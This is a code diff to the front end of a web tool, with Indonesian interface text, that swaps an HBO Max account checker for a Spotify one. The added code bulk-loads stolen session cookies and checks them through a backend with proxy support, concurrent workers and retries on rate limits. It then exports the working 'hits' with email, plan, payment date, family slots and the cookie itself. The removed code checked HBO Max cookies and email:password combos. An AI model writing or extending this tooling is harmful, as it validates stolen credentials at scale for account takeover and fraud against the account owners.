-    comboBtn.style.borderColor = 'var(--primary)';
-    filesBtn.style.background = '';
-    filesBtn.style.color = '';
-    filesBtn.style.borderColor = '';
-  }
-}
-
-function handleHboCookieFiles(fileList) {
-  for (const file of fileList) {
+  Array.from(files).forEach(file => {
     const reader = new FileReader();
-    reader.onload = (e) => {
-      hboCookieFiles.push({ name: file.name, content: e.target.result, size: file.size });
-      renderHboFileList();
+    reader.onload = function(e) {
+      const content = e.target.result.trim();
+      if (!content) { processed++; return; }
+
+      // JSON array: extract each cookie object as a separate entry
+      if (file.name.endsWith('.json')) {
+        try {
+          const arr = JSON.parse(content);
+          if (Array.isArray(arr) && arr.length > 0) {
+            // If it's an array of cookie objects (has 'name'/'domain'), treat whole file as one cookie set
+            if (arr[0] && arr[0].name) {
+              spotifyFileQueue.push(JSON.stringify(arr));
+            } else {
+              // Array of strings or sp_dc values
+              arr.forEach(item => {
+                const val = typeof item === 'string' ? item.trim() : JSON.stringify(item);
+                if (val) spotifyFileQueue.push(val);
+              });
+            }
+          }
+        } catch(ex) {
+          // Not valid JSON, treat as plain text
+          spotifyFileQueue.push(content);
+        }
+      } else {
+        // .txt / .cookie — each file could be:
+        // 1. A single Netscape cookie file (multiple tab-separated lines) → treat as one cookie set
+        // 2. A list of sp_dc values (one per line) → each line is a separate cookie
+        const lines = content.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+        if (!lines.length) { processed++; return; }
+
+        // Check if it looks like Netscape format (tab-separated, has domain field)
+        const isNetscape = lines.some(l => l.split('\t').length >= 7);
+        if (isNetscape) {
+          // Entire file is one cookie set (Netscape format)
+          spotifyFileQueue.push(lines.join('\n'));
+        } else {
+          // Each line is a separate sp_dc cookie
+          lines.forEach(l => spotifyFileQueue.push(l));
+        }
+      }
+
+      processed++;
+      if (processed === total) {
+        const totalCookies = spotifyFileQueue.length;
+        fileInfo.textContent = `✅ ${total} file dimuat → ${totalCookies} cookie ditemukan`;
+        fileInfo.style.color = 'var(--primary)';
+        // Also fill textarea with preview
+        textarea.value = spotifyFileQueue.join('\n\n');
+        showToast(`${totalCookies} cookies dari ${total} file siap dicheck`);
+      }
+    };
+    reader.onerror = () => {
+      processed++;
+      if (processed === total) {
+        fileInfo.textContent = `⚠️ Beberapa file gagal dimuat`;
+        fileInfo.style.color = 'var(--dead)';
+      }
     };
     reader.readAsText(file);
+  });
+}
+
+async function runSpotifyBulk() {
+  // Combine file queue + textarea
+  let lines = [];
+  if (spotifyFileQueue.length > 0) {
+    lines = [...spotifyFileQueue];
   }
+  const raw = document.getElementById('spotify-bulk-input').value.trim();
+  if (raw) {
+    // Also parse textarea content
+    let textLines;
+    if (raw.includes('\n\n')) {
+      textLines = raw.split(/\n\s*\n/).map(b => b.trim()).filter(b => b);
+    } else {
+      textLines = raw.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+    }
+    // Dedupe: only add textarea lines not already in file queue
+    const existing = new Set(lines);
+    textLines.forEach(l => { if (!existing.has(l)) lines.push(l); });
+  }
+  if (!lines.length) return showToast('Upload file atau paste cookies terlebih dahulu');
+  if (spotifyBulkRunning) return;
+
+  spotifyBulkRunning = true; spotifyBulkAbort = false; spotifyBulkResults = [];
+  const outEl = document.getElementById('spotify-bulk-out');
+  const statsEl = document.getElementById('spotify-bulk-stats');
+  const progressEl = document.getElementById('spotify-bulk-progress');
+  const barEl = document.getElementById('spotify-progress-bar');
+  const useProxy = document.getElementById('spotify-proxy-toggle')?.checked ?? false;
+  outEl.innerHTML = ''; progressEl.style.display = 'block'; barEl.style.width = '0%';
+  let done = 0, live = 0, free = 0, dead = 0, errors = 0;
+  const total = lines.length;
+  const startTime = Date.now();
+  let currentIndex = 0;
+  const concurrency = 3;
+
+  async function worker() {
+    while (currentIndex < lines.length && !spotifyBulkAbort) {
+      const idx = currentIndex++;
+      const cookie = lines[idx];
+      let retries = 0, success = false;
+      while (retries < 3 && !success) {
+        try {
+          const res = await fetch('/api/spotify/check', {
+            method: 'POST',
+            headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ cookie, use_proxy: useProxy })
+          });
+          if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; spotifyBulkAbort = true; break; }
+          if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
+          const data = await res.json(); data.cookie = cookie; spotifyBulkResults.push(data);
+          success = true;
+          if (data.status === 'LIVE') live++;
+          else if (data.status === 'FREE') free++;
+          else if (data.status === 'DEAD') dead++;
+          else errors++;
+          outEl.innerHTML += renderSpotifyResult(data, 'bulk');
+          outEl.scrollTop = outEl.scrollHeight;
+          updateSpotifyStats(data.status);
+          if (data.status === 'LIVE') playAlert('live');
+        } catch(e) {
+          retries++;
+          if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ Error: ${e.message}</div>`; success = true; }
+          else { await new Promise(r => setTimeout(r, 2000)); }
+        }
+      }
+      done++;
+      barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
+      const elapsed = (Date.now() - startTime) / 1000;
+      const speed = done / elapsed;
+      const eta = Math.ceil((total - done) / speed);
+      statsEl.innerHTML = `<span style="color:#1DB954;">${live} LIVE</span> · <span style="color:#38bdf8;">${free} FREE</span> · <span style="color:#f43f5e;">${dead} DEAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total} · ${speed.toFixed(1)}/s · ETA: ${eta}s`;
+    }
+  }
+
+  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
+  await Promise.all(workers);
+  spotifyBulkRunning = false;
+  if (spotifyBulkAbort) statsEl.innerHTML += ' · <span style="color:#f59e0b;">STOPPED</span>';
+  else statsEl.innerHTML += ' · <span style="color:#1DB954;">DONE</span>';
 }
 
-function renderHboFileList() {
-  const list = document.getElementById('hbo-file-list');
-  const count = document.getElementById('hbo-file-count');
-  count.textContent = `${hboCookieFiles.length} file dipilih`;
-  list.innerHTML = hboCookieFiles.map((f, i) => {
-    const sizeStr = f.size > 1024 ? `${(f.size/1024).toFixed(1)} KB` : `${f.size} B`;
-    const isNetscape = f.content.includes('\t') && (f.content.includes('.hbomax.com') || f.content.includes('hbomax.com') || f.content.includes('.max.com'));
-    const isJwt = f.content.trim().startsWith('eyJ') && f.content.trim().split('.').length === 3;
-    const fmt = isNetscape ? '🍪 Netscape' : isJwt ? '🔑 JWT' : '📄 Token';
-    return `<div style="display:flex; align-items:center; gap:8px; padding:4px 8px; background:var(--bg-subtle); border-radius:var(--radius-sm); margin-bottom:4px; font-size:11px;">
-      <span style="color:var(--primary); font-weight:600;">${fmt}</span>
-      <span style="flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${f.name}">${f.name}</span>
-      <span style="color:var(--text-dim);">${sizeStr}</span>
-      <button onclick="removeHboCookieFile(${i})" style="background:none; border:none; color:var(--dead); cursor:pointer; font-size:14px; padding:0 2px;">✕</button>
-    </div>`;
-  }).join('');
+function stopSpotifyBulk() { spotifyBulkAbort = true; }
+
+function clearSpotifyFileUpload() {
+  spotifyFileQueue = [];
+  const fileInfo = document.getElementById('spotify-file-info');
+  if (fileInfo) { fileInfo.style.display = 'none'; fileInfo.textContent = ''; }
+  const input = document.getElementById('spotify-file-input');
+  if (input) input.value = '';
 }
 
-function removeHboCookieFile(idx) {
-  hboCookieFiles.splice(idx, 1);
-  renderHboFileList();
-}
-
-function clearHboCookieFiles() {
-  hboCookieFiles = [];
-  document.getElementById('hbo-file-input').value = '';
-  renderHboFileList();
-}
-
-// Drag & drop support
-document.addEventListener('DOMContentLoaded', () => {
-  const dropZone = document.getElementById('hbo-drop-zone');
-  if (!dropZone) return;
-  ['dragenter', 'dragover'].forEach(evt => {
-    dropZone.addEventListener(evt, (e) => {
-      e.preventDefault(); e.stopPropagation();
-      dropZone.style.borderColor = 'var(--primary)';
-      dropZone.style.background = 'rgba(176, 27, 239, 0.08)';
-    });
-  });
-  ['dragleave', 'drop'].forEach(evt => {
-    dropZone.addEventListener(evt, (e) => {
-      e.preventDefault(); e.stopPropagation();
-      dropZone.style.borderColor = 'var(--border)';
-      dropZone.style.background = 'var(--bg-input)';
-    });
-  });
-  dropZone.addEventListener('drop', (e) => {
-    const files = e.dataTransfer.files;
-    if (files.length) handleHboCookieFiles(files);
-  });
-});
-
-function exportHboHits() {
-  const hits = hboBulkResults.filter(r => r.status === 'LIVE');
+function exportSpotifyHits() {
+  const hits = spotifyBulkResults.filter(r => r.status === 'LIVE');
   if (!hits.length) return showToast('Belum ada hits untuk diexport');
-  const text = hits.map(h => `${h.combo} | Plan: ${h.plan || 'N/A'} | Country: ${h.country || 'N/A'} | Tier: ${h.tier || 'N/A'}`).join('\n');
+  const text = hits.map(h => `${h.email || 'N/A'} | Plan: ${h.plan || 'N/A'} | Country: ${h.country || 'N/A'} | Next: ${h.next_payment_date || 'N/A'} | Owner: ${h.is_owner ? 'Yes' : 'No'} | Slots: ${h.free_slots ?? 'N/A'} | Cookie: ${h.cookie || 'N/A'}`).join('\n');
   const blob = new Blob([text], { type: 'text/plain' });
   const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
-  a.download = `hbomax_hits_${new Date().toISOString().slice(0,10)}.txt`;
+  a.download = `spotify_hits_${new Date().toISOString().slice(0,10)}.txt`;
   a.click(); showToast(`${hits.length} hits exported`);
 }
 
-function updateHboStats(status) {
-  if (status === 'LIVE') hboStats.live++;
-  else if (status === 'HOLD') hboStats.hold++;
-  else if (status === 'BAD' || status === 'DEAD') hboStats.bad++;
-  else hboStats.error++;
-
-  const dashboard = document.getElementById('hbo-stats-dashboard');
-  if (dashboard) dashboard.style.display = 'block';
-
-  document.getElementById('hbo-stat-live').textContent = hboStats.live;
-  document.getElementById('hbo-stat-hold').textContent = hboStats.hold;
-  document.getElementById('hbo-stat-bad').textContent = hboStats.bad;
-  document.getElementById('hbo-stat-error').textContent = hboStats.error;
-
-  const total = hboStats.live + hboStats.hold + hboStats.bad + hboStats.error;
-  document.getElementById('hbo-donut-total').textContent = total;
-
-  const hitRate = total > 0 ? ((hboStats.live + hboStats.hold) / total * 100) : 0;
-  document.getElementById('hbo-hit-rate').textContent = hitRate.toFixed(1) + '%';
-  document.getElementById('hbo-hit-rate-bar').style.width = hitRate + '%';
-
-  drawDonutChart('hbo-donut-chart', [
-    { val: hboStats.live,  color: '#10b981' },
-    { val: hboStats.hold,  color: '#f59e0b' },
-    { val: hboStats.bad,   color: '#f43f5e' },
-    { val: hboStats.error, color: '#94a3b8' },
-  ]);
+function copySpotifyHits() {
+  const hits = spotifyBulkResults.filter(r => r.status === 'LIVE');
+  if (!hits.length) return showToast('Belum ada hits untuk dicopy');
+  const text = hits.map(h => `${h.email || 'N/A'} | Plan: ${h.plan || 'N/A'} | Country: ${h.country || 'N/A'} | Next: ${h.next_payment_date || 'N/A'} | Cookie: ${h.cookie || 'N/A'}`).join('\n');
+  navigator.clipboard.writeText(text).then(() => showToast(`${hits.length} hits copied to clipboard`));
 }
 
-function resetHboStats() {
-  hboStats.live = 0; hboStats.hold = 0; hboStats.bad = 0; hboStats.error = 0;
-  ['hbo-stat-live','hbo-stat-hold','hbo-stat-bad','hbo-stat-error'].forEach(id => document.getElementById(id).textContent = '0');
-  document.getElementById('hbo-donut-total').textContent = '0';
-  document.getElementById('hbo-hit-rate').textContent = '0%';
-  document.getElementById('hbo-hit-rate-bar').style.width = '0%';
-  drawDonutChart('hbo-donut-chart', []);
-  showToast('Stats direset');
-}
-
-document.getElementById('hbo-password')?.addEventListener('keydown', e => {
-  if (e.key === 'Enter') runHboSingle();
-});
 
 </script>
 </body>
